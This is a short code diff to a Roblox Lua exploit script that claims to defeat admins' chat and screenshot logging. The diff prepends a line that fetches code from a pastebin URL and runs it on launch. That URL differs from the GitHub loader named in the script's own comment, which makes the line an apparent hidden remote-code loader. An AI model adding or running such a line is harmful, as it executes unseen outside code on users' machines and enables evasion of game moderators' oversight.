@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
 --< ANTI CHAT AND SCREENSHOT LOGGER FOR ROBLOX ADMINS [WORKS ON ANY GAME UNLESS THE CHAT IS DISABLED]
 --< Loadstring: loadstring(game:HttpGet("https://raw.githubusercontent.com/xrtzrr/scripts/main/AntiChatandScreenshotLogger.lua"))()
 
